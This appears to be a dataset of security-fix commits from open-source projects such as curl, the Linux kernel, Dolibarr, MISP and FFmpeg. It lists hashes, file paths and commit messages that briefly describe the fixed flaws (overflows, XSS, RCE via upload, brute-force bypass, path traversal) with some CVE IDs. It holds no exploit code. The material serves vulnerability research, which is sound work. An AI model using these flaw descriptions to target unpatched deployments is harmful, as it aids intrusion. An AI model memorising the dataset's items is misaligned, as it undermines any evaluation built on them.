drm/vmwgfx: Make sure backup_handle is always valid\n\nWhen vmw_gb_surface_define_ioctl() is called with an existing buffer, we end up returning an uninitialized variable in the backup_handle.\n\nThe fix is to first initialize backup_handle to 0 just to be sure, and second, when a user-provided buffer is found, we will use the req->buffer_handle as the backup_handle.\n\nCc: <stable@vger.kernel.org> Reported-by: Murray McAllister <murray.mcallister@insomniasec.com> Signed-off-by: Sinclair Yeh <syeh@vmware.com> Reviewed-by: Deepak Rawat <drawat@vmware.com>

======================================================================
Commit With Fix: 
    3cd666558c89d9c4b27eb74bf6b8e81b4f6e7118
File(s) In Commit: 
    modules/Base/Lang/Administrator/update_translation.php
Blob(s) In Commit: 
    c65854bd320df18f0df3da71040d34ab84a9c2cc
Blob(s) Before Fix: 
    caeebea3cb5d9f867e46508b2b8f563ffe8ab9e7
Projects:
    BramPeerlings_EPESI
Commit Message for 3cd666558c89d9c4b27eb74bf6b8e81b4f6e7118:
Closes #185

======================================================================
Commit With Fix: 
    f237f3e09ecbaf59c897f5046538a7b1a3fa40c1
File(s) In Commit: 
    bin/gssstdio.c
Blob(s) In Commit: 
    01199fef373455390bfa319fddf1c748f133e1a5
Blob(s) Before Fix: 
    6a942081ac2e07e9f66879d68010aebc126606e5
Projects:
    arpa2_knc
Commit Message for f237f3e09ecbaf59c897f5046538a7b1a3fa40c1:
knc: fix a couple of memory leaks.\n\nOne of these can be remotely triggered during the authentication phase which leads to a remote DoS possibility.\n\nPointed out by: Imre Rad <radimre83@gmail.com>

======================================================================
Commit With Fix: 
    ba1dbd78e5f1ed67c1b8d37ac89d90e5e330b628
File(s) In Commit: 
    lib/smtp.c
Blob(s) In Commit: 
    ecf10a41ac3746087a201e3a2cadeb4dd6dfacef
Blob(s) Before Fix: 
    065c7037f3ed8a9b890f3a8feb6ab620cf3840a1
    08d8148a3c287fe8d22119f427a01feca579eba1
    3f3b45a9546eaee33e177a5e41b620c395320944
    44ee2e9f8fd12057caebf773815c397e0a9d3b93
    762a8d16a65956d39a8b81aa75c175a51f619456
    83fb9ec440363312e3e56b9e8fb8026f8482c864
    a4fc2c26e0e5b69505052718fc79c328d8d45ed7
    adc346a6933288b4b89de150643516fc2626793c
    d203b53238f031d7d1dffd075f5ed1a21c6ac465
    d2d4aeb14143c6c0695eb74d20b108846be5656a
    d9f1a854aa9a509f23c79427f459e7733a7aa44f
    e6872badb8893ff95d8a78320b51f506597c93b4
    fe064cb2f1b75f6ff412cae10585f3644fae0809
Projects:
    0ca_curl
Commit Message for ba1dbd78e5f1ed67c1b8d37ac89d90e5e330b628:
smtp: use the upload buffer size for scratch buffer malloc\n\n... not the read buffer size, as that can be set smaller and thus cause a buffer overflow! CVE-2018-0500\n\nReported-by: Peter Wu Bug: https://curl.haxx.se/docs/adv_2018-70a2.html

======================================================================
Commit With Fix: 
    244d83bc3d859293f55812d48b3db168e581f6ab
File(s) In Commit: 
    stb_vorbis.c
Blob(s) In Commit: 
    49829d2c03c07cced5ccc83e7f5f1777f288a0f2
Blob(s) Before Fix: 
    1181e6d04caf8a8af52abaa43696195048bdc900
    14cebbf87ed7a07ee00da46c73c47bd9cf55ac84
Projects:
    004307ec_stb
Commit Message for 244d83bc3d859293f55812d48b3db168e581f6ab:
fix unchecked length in stb_vorbis that could crash on corrupt/invalid files

======================================================================
Commit With Fix: 
    ce361a12e355f9e1e99c989f1ea056c9e502dbe7
File(s) In Commit: 
    atom/app/command_line_args.cc
Blob(s) In Commit: 
    e83eed46f2e1178367a8582ece3888b505429d5b
Blob(s) Before Fix: 
    d7426de7dc564e7bab01ded62d640e44729f5a7f
Projects:
    00cool_electron
Commit Message for ce361a12e355f9e1e99c989f1ea056c9e502dbe7:
Use case-insensitive switch comparisons

======================================================================
Commit With Fix: 
    980230645c8ea3b531b85401de5e4bca0f860e42
File(s) In Commit: 
    src/ios/CDVKeychain.m
Blob(s) In Commit: 
    6c2fea4cbb55b9fc204c9ac44404e49ac5e09c89
Blob(s) Before Fix: 
    8731cdbe91f291af47cff3a6a0721e4dd90d28fa
    dbc0a4049e6609bd32cb87af004e123964d4ef67
Projects:
    crees1_Keychain
Commit Message for 980230645c8ea3b531b85401de5e4bca0f860e42:
Fixing security issue\n\nPlugin logs sensitive information and that is considered as a security issue. iOS logs are can be easily accessed by attacker.    References:  https://www.owasp.org/index.php/Mobile_Top_10_2016-M2-Insecure_Data_Storage  https://www.kaspersky.com/blog/starbucks-moves-quick-to-fix-application-security-vulnerability/3510/ (Starbucks for instance had problem with placing sensitive data to iOS logs and that was a big scandal  -) )

======================================================================
Commit With Fix: 
    a8c4a82787b8b6c256d61bd5c42fb7f92d1bae00
File(s) In Commit: 
    memcached.c
Blob(s) In Commit: 
    044064fc8facc6e1610b4bebeeb78a5962bf411a
Blob(s) Before Fix: 
    d0533c5add85b68748602673c3d56d1cbf2457b1
Projects:
    0xfacade_memcached
Commit Message for a8c4a82787b8b6c256d61bd5c42fb7f92d1bae00:
Don't overflow item refcount on get\n\nCounts as a miss if the refcount is too high. ASCII multigets are the only time refcounts can be held for so long.\n\ndoing a dirty read of refcount. is aligned.\n\ntrying to avoid adding an extra refcount branch for all calls of item_get due to performance. might be able to move it in there after logging refactoring simplifies some of the branches.

======================================================================
Commit With Fix: 
    a45b599ad808c3c982fdcdc12b0b8611c2f92824
File(s) In Commit: 
    drivers/scsi/sg.c
Blob(s) In Commit: 
    5c40d809830f85916a7ed210798e54b2522fcda7
Blob(s) Before Fix: 
    0c434453aab38386d6d0c2b727568141fc205aa1
    29b86505f796d9fa57c19b958c1c7ae4ef31b298
    84e782d8e7c3f0cb8dd4c3bdedb46b7060b18f1e
    aa28874e8fb92f5090d64c9ceb9523fce224eabe
    c198b96368dd69beba2dcffbe16efe7a3c74ae1d
    cf0e71db9e5146068294ab46fb1db1fa69addbc9
    f098877eed4aa83fb4c1245e49b378a7699389d5
Projects:
    0-T-0_ps4-linux
Commit Message for a45b599ad808c3c982fdcdc12b0b8611c2f92824:
scsi: sg: allocate with __GFP_ZERO in sg_build_indirect()\n\nThis shall help avoid copying uninitialized memory to the userspace when calling ioctl(fd, SG_IO) with an empty command.\n\nReported-by: syzbot+7d26fc1eea198488deab@syzkaller.appspotmail.com Cc: stable@vger.kernel.org Signed-off-by: Alexander Potapenko <glider@google.com> Acked-by: Douglas Gilbert <dgilbert@interlog.com> Reviewed-by: Johannes Thumshirn <jthumshirn@suse.de> Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

======================================================================
Commit With Fix: 
    72a02ebaaf95a80e26127ee7ee2b123cccce05a7
File(s) In Commit: 
    application/third_party/pclzip/pclzip.lib.php
Blob(s) In Commit: 
    8c7cbc79395a1c36ec8a2cbf1bf109e28dc8b464
Blob(s) Before Fix: 
    2ac786dd251cb3bbf7f481948e5398bb1485b592
Projects:
    3limin4t0r_LimeSurvey
Commit Message for 72a02ebaaf95a80e26127ee7ee2b123cccce05a7:
[security] fixed issue #13959: RCE via resource file upload as authenticated user\n\n

======================================================================
Commit With Fix: 
    7ebf02af2e90f03e0dbd0e18b8b3164f372fb97c
File(s) In Commit: 
    soundlib/Snd_fx.cpp
Blob(s) In Commit: 
    29f93c1de1625eec870c49d89f9b69708f3e8ba4
Blob(s) Before Fix: 
    c623da591f3790ce3a8e0157e058921d36e21d05
Projects:
    DW01_openmpt
Commit Message for 7ebf02af2e90f03e0dbd0e18b8b3164f372fb97c:
[Fix] Possible out-of-bounds read when computing length of some IT files with pattern loops (OpenMPT: formats that are converted to IT, libopenmpt: IT/ITP/MO3), caught with afl-fuzz.\n\ngit-svn-id: https://source.openmpt.org/svn/openmpt/trunk/OpenMPT@10027 56274372-70c3-4bfc-bfc3-4c3a0b034d27

======================================================================
Commit With Fix: 
    62f64004fefb894c523a7143e8a88ebe6c84df25
File(s) In Commit: 
    adm-zip.js
Blob(s) In Commit: 
    634a96e540c9c9a0e02f70c5c633849cc71ad7bd
Blob(s) Before Fix: 
    972608f7da7a49d28f88d15e8ac5a3b17c7b55ee
Projects:
    1534854467_adm-zip
Commit Message for 62f64004fefb894c523a7143e8a88ebe6c84df25:
Merge pull request #212 from aviadatsnyk/master\n\nfix: prevent extracting archived files outside of target path.  Credit to Snyk Security Research Team for disclosure and fixing the issue.

======================================================================
Commit With Fix: 
    5d121b2d3ae2a95abebc9dc31e4782cbc61a1f39
File(s) In Commit: 
    htdocs/admin/security_file.php
Blob(s) In Commit: 
    143cc17e46f44768ba41276c8db03bd19b382fc6
Blob(s) Before Fix: 
    1053658b1915ac7f93b79cd7ba12e6312e29a795
Projects:
    01viniciusmelo_dolibarr
Commit Message for 5d121b2d3ae2a95abebc9dc31e4782cbc61a1f39:
FIX CVE-2018-10092

======================================================================
Commit With Fix: 
    7ade4e37f24d6859987bb9f6232f604325633fdd
File(s) In Commit: 
    htdocs/adherents/list.php
Blob(s) In Commit: 
    68062b895a09231f270186e169b52c96fe89b734
Blob(s) Before Fix: 
    7b33c8b6ffab0a448d3934686ea9f59e206691e3
    96fd53b05844a51651d363367b68dbe73dfb2b95
    a01cc379b3c41f7299baeba2ef94d8f5027a6e85
    cae878829b71a084f0acbd3019f679e1dae32da5
    f2f7aacbf523794e61a3d613f6a047538b676eed
    fc30d6f1ae2819041f87beeb3de4eddd6d5a0522
Projects:
    01viniciusmelo_dolibarr
Commit Message for 7ade4e37f24d6859987bb9f6232f604325633fdd:
FIX CVE-2018-10094

======================================================================
Commit With Fix: 
    1dc466e1fb687cfe647de4af891720419823ed56
File(s) In Commit: 
    htdocs/adherents/cartes/carte.php
Blob(s) In Commit: 
    05b71ba1360bad80caeacd76307ff17be955fa29
Blob(s) Before Fix: 
    59713e20573be8ea7dc81d1094e8499ac285c5c8
    b5e4efaec16ea4ab19ea20a3068f7762da733c52
    be11b08c9eec074fad205e865949cd9b77a9401f
    db4c631c0c9e9c93bb612f3a7f785f542f592036
Projects:
    01viniciusmelo_dolibarr
Commit Message for 1dc466e1fb687cfe647de4af891720419823ed56:
FIX CVE-2018-10095

======================================================================
Commit With Fix: 
    b51b21fc63c9805862322551387d9036f2b63433
File(s) In Commit: 
    mrbgems/mruby-io/src/io.c
Blob(s) In Commit: 
    6ace9e1673d1c919219dcb83f853a956227a9598
Blob(s) Before Fix: 
    58bcdd1ee15d94017851f5d7290bf1cc59489505
Projects:
    007lva_mruby
Commit Message for b51b21fc63c9805862322551387d9036f2b63433:
Fix `use after free in File#initilialize_copy`  fix #4001\n\nThe bug and the fix were reported by https://hackerone.com/pnoltof

======================================================================
Commit With Fix: 
    a642587a9c9e2dd7feacdf513c3643ce26ad3c22
File(s) In Commit: 
    src/readelf.c
Blob(s) In Commit: 
    1f41b46113c34006f10744d65c0c918b74dd63fc
Blob(s) Before Fix: 
    79c83f9f50488e6771c8535b0476917c7a92b40e
Projects:
    5hadowblad3_file
Commit Message for a642587a9c9e2dd7feacdf513c3643ce26ad3c22:
Avoid reading past the end of buffer (Rui Reis)

======================================================================
Commit With Fix: 
    098c2bc907443d67e9e18645f850e3de42941d20
File(s) In Commit: 
    components/account/update.htm
Blob(s) In Commit: 
    7d980daa3d1485f1ca62a3e5206ded4f9a551330
Blob(s) Before Fix: 
    a294dd0d42cba3aa5c8a568728a5cdcff4952a20
Projects:
    Anglius_user-plugin
Commit Message for 098c2bc907443d67e9e18645f850e3de42941d20:
KISS and form_value() doesn't use escaping

======================================================================
Commit With Fix: 
    609bd17728ee1db0487a42d96028d30537528ae8
File(s) In Commit: 
    core/inc/bigtree/apis/storage.php
Blob(s) In Commit: 
    582bb7e4dda60136ce4c3c6997910970923fe8e4
Blob(s) Before Fix: 
    e6d4bcb94b4f723ca5b809b40eeb9691e91aa7ac
Projects:
    4v4t4r_BigTree-CMS
Commit Message for 609bd17728ee1db0487a42d96028d30537528ae8:
Rejecting htaccess files: https://github.com/bigtreecms/BigTree-CMS/issues/335

======================================================================
Commit With Fix: 
    b588a2249c7abbfc52173e32ee11d6facef82f89
File(s) In Commit: 
    ngiflib.c
Blob(s) In Commit: 
    ac8dc2a54e92df0ebe18ca2e434a73af715cb0ef
Blob(s) Before Fix: 
    b4785b825f20af830b2888f47c08dfd0d82083da
Projects:
    miniupnp_ngiflib
Commit Message for b588a2249c7abbfc52173e32ee11d6facef82f89:
check GIF image position and dimensions\n\nfixes #1

======================================================================
Commit With Fix: 
    b71812168571fa55e44cdd0254471331b9c4c4c6
File(s) In Commit: 
    net/bridge/netfilter/ebtables.c
Blob(s) In Commit: 
    254ef9f4956790655652d92bd0b91b1a81f184d4
Blob(s) Before Fix: 
    02c4b409d31733c6192110139570e48980aa1740
    37817d25b63d71eaaf0ee8081d705d649c1b8d9c
    3b3dcf719e0783e74ecf9018b3fd1728a31f6393
    537e3d506fc237f673af53a50109fea6935872ff
    61f87879e389713191c54f42efc9784e7b9996de
    79b69917f5210c0065ab5c9c37a497ede7cc273b
    83951f978445e5b9daede1eac715cec0d9f42987
    9c6e619f452bc96770a8e340d3879adce6dadd2a
    f46ca417bf2d147118f8d37c67d9bffbee59724f
    f5c11bbe27db651dfd66f6cb8e7dc5b77b88a511
Projects:
    0-T-0_ps4-linux
Commit Message for b71812168571fa55e44cdd0254471331b9c4c4c6:
netfilter: ebtables: CONFIG_COMPAT: don't trust userland offsets\n\nWe need to make sure the offsets are not out of range of the total size. Also check that they are in ascending order.\n\nThe WARN_ON triggered by syzkaller (it sets panic_on_warn) is changed to also bail out, no point in continuing parsing.\n\nBriefly tested with simple ruleset of -A INPUT --limit 1/s' --log plus jump to custom chains using 32bit ebtables binary.\n\nReported-by: <syzbot+845a53d13171abf8bf29@syzkaller.appspotmail.com> Signed-off-by: Florian Westphal <fw@strlen.de> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

======================================================================
Commit With Fix: 
    cf429e0a2fe26b5f01ce0c8e9b79432e94509b6e
File(s) In Commit: 
    ngiflib.c
Blob(s) In Commit: 
    32596d093dc5cca553f833b7f7d1acf50b589962
Blob(s) Before Fix: 
    ac8dc2a54e92df0ebe18ca2e434a73af715cb0ef
Projects:
    miniupnp_ngiflib
Commit Message for cf429e0a2fe26b5f01ce0c8e9b79432e94509b6e:
fix "pixel overrun"\n\nfixes #3

======================================================================
Commit With Fix: 
    a817755828cd0bfd4b87b0eb5cec59ffe57d3c3e
File(s) In Commit: 
    upload/templates/freshcat/js/backend.js
Blob(s) In Commit: 
    e4e07ff9a5b3fee690cccd3e8dc8a10eb143ca6d
Blob(s) Before Fix: 
    2a393c2d81d8a1559b53fd6daf7b5e085957c2ab
Projects:
    ircoco_BlackCatCMS
Commit Message for a817755828cd0bfd4b87b0eb5cec59ffe57d3c3e:
fix for issue #384

======================================================================
Commit With Fix: 
    c1fa0768a8713b135848f78fd43ffc208d8ded70
File(s) In Commit: 
    arch/powerpc/kernel/ptrace.c
Blob(s) In Commit: 
    f52ad5bb710960906b8ae61400688845e2811dd5
Blob(s) Before Fix: 
    07cd22e354053597d990bf57457164bbb6f02b9c
    134bee9ac664db9b36b3c0961bd36a1f2d72b720
    30a03c03fe734a8c80828fc4260fe3679ab63e85
    4f3c5756cc09898f984de4cc6cf6fc7c1ba830ac
    5c8f12fe9721d0945af35666348a26891c023a04
    5de73dbd15c7e404a16257ae5239e9b1af293f65
    64f7bd5b1b0f59bcf23fa47c22eb012a5a440b16
    660ed39e9c9a59fc3b7087362787502a41ba50fd
    737c0d0b53ac43dcdc41f09b0a3177cf8b4e389b
    81750d9624abbd14164e2a740e43b4b7ea393b9f
    925a4ef9055932174b4dc5a8f0424b330149132b
    9a0d24c390a3535e16c934f80ec19695da04d095
    afb819f4ca68bee0f88fab357ffe9395508dc106
    b1ec62f2cc316a337c77fc3fe5a3bd6a23680d40
    b38fd081b22235500b4b43cad1e11da9ea294e91
    b8d4f07f332cf2da69aa919bd7c40443eb4f5ce4
    dcbb9144c16d28b1ca0027abf1a911ef7f486817
    f21897b420576c63330eb5c62982ba0729229a85
Projects:
    0-T-0_ps4-linux
Commit Message for c1fa0768a8713b135848f78fd43ffc208d8ded70:
powerpc/tm: Flush TM only if CPU has TM feature\n\nCommit cd63f3c ("powerpc/tm: Fix saving of TM SPRs in core dump") added code to access TM SPRs in flush_tmregs_to_thread(). However flush_tmregs_to_thread() does not check if TM feature is available on CPU before trying to access TM SPRs in order to copy live state to thread structures. flush_tmregs_to_thread() is indeed guarded by CONFIG_PPC_TRANSACTIONAL_MEM but it might be the case that kernel was compiled with CONFIG_PPC_TRANSACTIONAL_MEM enabled and ran on a CPU without TM feature available, thus rendering the execution of TM instructions that are treated by the CPU as illegal instructions.\n\nThe fix is just to add proper checking in flush_tmregs_to_thread() if CPU has the TM feature before accessing any TM-specific resource, returning immediately if TM is no available on the CPU. Adding that checking in flush_tmregs_to_thread() instead of in places where it is called, like in vsr_get() and vsr_set(), is better because avoids the same problem cropping up elsewhere.\n\nCc: stable@vger.kernel.org # v4.13+ Fixes: cd63f3c ("powerpc/tm: Fix saving of TM SPRs in core dump") Signed-off-by: Gustavo Romero <gromero@linux.vnet.ibm.com> Reviewed-by: Cyril Bur <cyrilbur@gmail.com> Signed-off-by: Michael Ellerman <mpe@ellerman.id.au>

======================================================================
Commit With Fix: 
    a27e07d90a4608ceaf928b1babb27d4d803e1992
File(s) In Commit: 
    src/MirrorJob.cc
Blob(s) In Commit: 
    0be45431fb59bd42b75a26f34ffe7bb54b081797
Blob(s) Before Fix: 
    c92c34dcf70a2444896774e947ba64a63d1b755a
    cf106c407eaee4363c9932de1ed192e1344e5dac
Projects:
    Acidburn0zzz_lftp
Commit Message for a27e07d90a4608ceaf928b1babb27d4d803e1992:
mirror: prepend ./ to rm and chmod arguments to avoid URL recognition (fix #452)

======================================================================
Commit With Fix: 
    3deae701cdd89753cb6688302aee5b93a72bc58b
File(s) In Commit: 
    Upload/admin/modules/home/index.php
Blob(s) In Commit: 
    6b42ec07c45ce4220110e556f2c0d3a971b5b0c3
Blob(s) Before Fix: 
    0935250c61cf9e43166c38e9170e21635fbf4970
Projects:
    0xB9_MyBB_Plugin-adminnotes
Commit Message for 3deae701cdd89753cb6688302aee5b93a72bc58b:
Add CSRF Token to Clear Table

======================================================================
Commit With Fix: 
    8f396cf35a3826044b089141667a196454c0a587
File(s) In Commit: 
    src/auth/cephx/CephxSessionHandler.cc
Blob(s) In Commit: 
    802b93cda52dec609f7a18ae55550ee2cc2d9297
Blob(s) Before Fix: 
    00b11338df5d2a8240f6ba4aaaaac402554990e7
    5694a22c0766eac87103ce0b157391b70578f5a2
    943b80afbd3ca6120d5f131c760183821fad2f0c
    989ba2d35fb5ad28519fb3d5ab1bf488b6b28e49
    f2e332b41b309f2584b50b20f06b595fd52e047a
Projects:
    0003ydlom_ceph
Commit Message for 8f396cf35a3826044b089141667a196454c0a587:
auth/cephx/CephxSessionHandler: implement CEPHX_V2 calculation mode\n\nDerive the signature from the entire buffer (both cipher blocks).\n\nSigned-off-by: Sage Weil <sage@redhat.com>

======================================================================
Commit With Fix: 
    10080096879d1076756f62760d6daf582b6db722
File(s) In Commit: 
    app/View/Elements/eventattribute.ctp
Blob(s) In Commit: 
    65c50c39fd90e24f928af5fa4ddd6665c77155ae
Blob(s) Before Fix: 
    1be6616706d8845459d6652c1f711ffda86bb54a
    bcae8d856bd152e5a754a9a7f79d3898dbc49553
Projects:
    0-vortex_MISP
Commit Message for 10080096879d1076756f62760d6daf582b6db722:
fix: Reflected XSS via the event view\n\n- users arriving on an event view via a malicious URL with a javascript payload and then clicking on the show deleted attributes tab would trigger the payload\n\n- as reported by Jarek Kozluk from zbp.pl

======================================================================
Commit With Fix: 
    2305368eb70a26cab34c772c9ae88787f4c3e669
File(s) In Commit: 
    public_html/admin/vqmods.app/vqmods.inc.php
Blob(s) In Commit: 
    41792bc2325aa357b5721bac29dd92c9b3bb2ef6
Blob(s) Before Fix: 
    04f7ee5ca9c01738a70062c7f50b1652f741826f
    c510b2f87f4545a610acdd5bbfc8531259d4b347
Projects:
    1d10t_litecart
Commit Message for 2305368eb70a26cab34c772c9ae88787f4c3e669:
! Verify that uploads have valid xml and vqmod content

======================================================================
Commit With Fix: 
    e1182fac1afba92a4975917823a5f644bee7e6e8
File(s) In Commit: 
    libavcodec/mpeg4videoenc.c
Blob(s) In Commit: 
    f6a5992df776d0ea874badb5b64081f7ad57d91b
Blob(s) Before Fix: 
    0cde63ba4e69d127786a66ff6b7ca37d3b9ec95c
    1ba92381ecab1d828460888af698853cd065d5a3
    31493100a09906fbe40f8f3ba1098738bee6da39
    494452c938347ee92035c5c898ebaaf41f8e3d9d
    5751432a3164c39bf2d1ceeec90584afe3e87da2
    5ca88c58798a0784d8c929b4d056d1e75850319a
    79190f0a6f07d945c11e472fce5ca620092c9a12
    8815ba85c4503cf22456f84e090c257b79d610f8
    ffa08beb8724e7843bcd627dae93da0126a674c7
Projects:
    00ERNEST00_FFmpeg
Commit Message for e1182fac1afba92a4975917823a5f644bee7e6e8:
avcodec/mpeg4videoenc: Use 64 bit for times in mpeg4_encode_gop_header()\n\nFixes truncation Fixes Assertion n <= 31 && value < (1U << n) failed at libavcodec/put_bits.h:169 Fixes: ffmpeg_crash_2.avi\n\nFound-by: Thuan Pham <thuanpv@comp.nus.edu.sg>, Marcel Böhme, Andrew Santosa and Alexandru RazvanCaciulescu with AFLSmart\n\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    2fc108f60f98cd00813418a8754a46476b404a3c
File(s) In Commit: 
    libavcodec/mpeg4videodec.c
Blob(s) In Commit: 
    d0ebaac6e8e8c653bde7250714ee56dc00ed5969
Blob(s) Before Fix: 
    319a3809ea56662f631a4336ab30388f327602d0
    32eb3d1ca8d6762b79009ee2c650ae41b0ea0f8b
    500068485786ce0bf508eb7f0a3bf434a349127c
    51b58fac02f9ddda9573b0ea119a491caa7ca071
    76247c3b8c5f1b50cdb842301d48fa38a945e156
Projects:
    00ERNEST00_FFmpeg
Commit Message for 2fc108f60f98cd00813418a8754a46476b404a3c:
avcodec/mpeg4videodec: Clear bits_per_raw_sample if it has originated from a previous instance\n\nFixes: assertion failure Fixes: ffmpeg_crash_5.avi\n\nFound-by: Thuan Pham <thuanpv@comp.nus.edu.sg>, Marcel Böhme, Andrew Santosa and Alexandru Razvan Caciulescu with AFLSmart Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    f57b660f49f830006766a8d4abc3b4af6e178063
File(s) In Commit: 
    src/api/app/models/bs_request_action_submit.rb
Blob(s) In Commit: 
    a08110ef40a1a4761e93bea4e2f115dbf2b2938c
Blob(s) Before Fix: 
    52d74e620c394421d2fbb412878237f2d31049a9
    7e4f39db1a8b9112022081323503c134fa6a6790
Projects:
    Abdelhamidhenni_open-build-service
Commit Message for f57b660f49f830006766a8d4abc3b4af6e178063:
Ignore a project link in BsRequestAction.check_action_permission!\n\nThis makes sure that we check the permissions of the correct package. For instance, assume that the project "Staging" is a link project where the link points to the "Base" project. Also, assume that there exists a "Base/foo" package, but there exists no explicit "Staging/foo" package. Moreover, assume we check the permissions for the following "submit" action:\n\n<action type="submit">   <source project="Staging" package="foo"/>   <target project="an_arbitrary_project" package="foo"/> </action>\n\nIn this case, the old code checks if request acceptor can modify the "Base/foo" package (since it follows the project link). This is wrong because the "Staging/foo" package would be turned into a branch during accept. The new code checks the correct package because it does not follow the project link and requires that the source package exists in the source project. Requiring the existence of the source package potentially breaks artificial requests (for instance, a request where the "submit" action from above is preceded by a "submit" action that creates a "Staging/foo" package).\n\nNote: so far I was unable to exploit the old code - so this is just to avoid a potential future headache.\n\nFixes: commit 990ef7ccc ("[api][webui] Check access to source package")

======================================================================
Commit With Fix: 
    f57b660f49f830006766a8d4abc3b4af6e178063
File(s) In Commit: 
    src/api/app/models/bs_request_action_submit.rb
Blob(s) In Commit: 
    a08110ef40a1a4761e93bea4e2f115dbf2b2938c
Blob(s) Before Fix: 
    52d74e620c394421d2fbb412878237f2d31049a9
    7e4f39db1a8b9112022081323503c134fa6a6790
Projects:
    Abdelhamidhenni_open-build-service
Commit Message for f57b660f49f830006766a8d4abc3b4af6e178063:
Ignore a project link in BsRequestAction.check_action_permission!\n\nThis makes sure that we check the permissions of the correct package. For instance, assume that the project "Staging" is a link project where the link points to the "Base" project. Also, assume that there exists a "Base/foo" package, but there exists no explicit "Staging/foo" package. Moreover, assume we check the permissions for the following "submit" action:\n\n<action type="submit">   <source project="Staging" package="foo"/>   <target project="an_arbitrary_project" package="foo"/> </action>\n\nIn this case, the old code checks if request acceptor can modify the "Base/foo" package (since it follows the project link). This is wrong because the "Staging/foo" package would be turned into a branch during accept. The new code checks the correct package because it does not follow the project link and requires that the source package exists in the source project. Requiring the existence of the source package potentially breaks artificial requests (for instance, a request where the "submit" action from above is preceded by a "submit" action that creates a "Staging/foo" package).\n\nNote: so far I was unable to exploit the old code - so this is just to avoid a potential future headache.\n\nFixes: commit 990ef7ccc ("[api][webui] Check access to source package")

======================================================================
Commit With Fix: 
    30610bda60cbfc058f90a1c0a17d0e8f4516221a
File(s) In Commit: 
    src/HTTPserver.cpp
Blob(s) In Commit: 
    68cffcfb5bad7574cd13dbb567c13ae5c9d574fd
Blob(s) Before Fix: 
    f954a4b942c17aa9321b2933d126664dbd38ac65
Projects:
    FrancescoStaccini_ntopng
Commit Message for 30610bda60cbfc058f90a1c0a17d0e8f4516221a:
Added code to randomize values returned by rand()

======================================================================
Commit With Fix: 
    2cb291191c93c7c4e371e22cb89805a5b31d6608
File(s) In Commit: 
    resip/stack/ConnectionBase.cxx
Blob(s) In Commit: 
    2ee7663d07bd2accfea2b0e3733a5dcfd502f38c
Blob(s) Before Fix: 
    8e7c69a82fa5492d69cca7018574fcacc84e7b57
Projects:
    AlanSchwartz_resiprocate
Commit Message for 2cb291191c93c7c4e371e22cb89805a5b31d6608:
-fixed an issue where the stack could crash if a TCP based sender sends a Content-Length that is less that the actual SIP body transmitted  in order to trigger this condition the SIP message body must arrive in a separate read request, either from the start or part way through the body  and there must be data following the body in the same read.

======================================================================
Commit With Fix: 
    bfdcdec64865238163282c5940a6c7896c0977bf
File(s) In Commit: 
    templates/frontend/pages/searchResults.tpl
Blob(s) In Commit: 
    036d6d6527dcb35dd986a3decd38d9200429f3d4
Blob(s) Before Fix: 
    d2bb7a43f498964424c7fa2b8146b28ed3308f80
Projects:
    EKT_omp
Commit Message for bfdcdec64865238163282c5940a6c7896c0977bf:
pkp/pkp-lib#3805 Add missing escaping to catalog.noTitlesSearch

======================================================================
Commit With Fix: 
    6ffacc1e239930e0e8464d0ca16e432e26cf36a9
File(s) In Commit: 
    app/Controller/UsersController.php
Blob(s) In Commit: 
    a272436ba56c05fa6a84557bc1d62ea14d65c8da
Blob(s) Before Fix: 
    9926c329f65e46a667f3a679cabd6fc8ce313ab9
    bdb591df209aec0d4260f31ffbd49391da7be162
    f71c1304b4036e7fe0327b5ca9cf8a3836cf87ac
    fb36dbb9cd159790bca472c8c360a82bc936877a
Projects:
    0-vortex_MISP
Commit Message for 6ffacc1e239930e0e8464d0ca16e432e26cf36a9:
fix: [security] Brute force protection can be bypased with a PUT request\n\n- fixes an issue where brute forcing the login would work by using PUT requests - as reported by Silver Saks from CCDCOE

======================================================================
Commit With Fix: 
    4be817e8b03e7e92517e91f2dfcc50865e91c6ea
File(s) In Commit: 
    src/zmq_van.h
Blob(s) In Commit: 
    f6a14cc4e54c6c85eeda32b55fbe2ce4e0f749ac
Blob(s) Before Fix: 
    c54d650c7769474c0bcee36c4fd5e7e41e52b1b4
Projects:
    131250105_ps-lite
Commit Message for 4be817e8b03e7e92517e91f2dfcc50865e91c6ea:
Avoid listening on all interfaces by default

======================================================================
Commit With Fix: 
    c3812075e30c76a800a961e7291087d357403f6b
File(s) In Commit: 
    rbd-target-api.py
Blob(s) In Commit: 
    394c7e075b62022f5595e1ae9da36786b8e54349
Blob(s) Before Fix: 
    450f96fd9b3774d43d9e10b2b1d16600ffd81693
Projects:
    SUSE_ceph-iscsi
Commit Message for c3812075e30c76a800a961e7291087d357403f6b:
rbd-target-api: disable the built-in werkzeug debugger\n\nSigned-off-by: Jason Dillaman <dillaman@redhat.com>

======================================================================
Commit With Fix: 
    72058f9253e7ed8c7243e2ff76a16d97b03d65ed
File(s) In Commit: 
    soscollector/sos_collector.py
Blob(s) In Commit: 
    f1d4716427003a981aaaa7a5e4a7fbbb63042c6a
Blob(s) Before Fix: 
    874022bd5239cfa592bd560b5af12223ec1b78b4
Projects:
    sosreport_sos-collector
Commit Message for 72058f9253e7ed8c7243e2ff76a16d97b03d65ed:
[sos_collector] Set umask for all files created\n\nSets a umask of 0077 for all files created by sos-collector. This ensures collected sosrpeorts are not world readable and maintains the original permissions of the sos archives.\n\nSigned-off-by: Jake Hunsaker <jhunsake@redhat.com>

======================================================================
Commit With Fix: 
    f18e5adf123221a1015be63e1ca2491ca45b8d10
File(s) In Commit: 
    lib/Server.js
Blob(s) In Commit: 
    c56fe79c33689aad46584caf2f502ca7f6243f41
Blob(s) Before Fix: 
    9f1992f733a4e30bdf11a8217a434940eb5765bc
Projects:
    0xCMP_webpack-dev-server
Commit Message for f18e5adf123221a1015be63e1ca2491ca45b8d10:
check origin header for websocket connection

======================================================================
Commit With Fix: 
    9ba91381954ad325ea4fd26b9c65a8bd9a2a85b6
File(s) In Commit: 
    tcpdump.c
Blob(s) In Commit: 
    043bda1d7aca523ac17d555e5bcd1e09a676adfe
Blob(s) Before Fix: 
    128e41ed9c6db9eb50293b8f868e63d2ef89cfba
    7e566c21654a99738c1590929282c8b77e587b99
    d9c7f7ab8f97677f1d0270fa8b429caa75487eec
Projects:
    0xmitsurugi_tcpdump
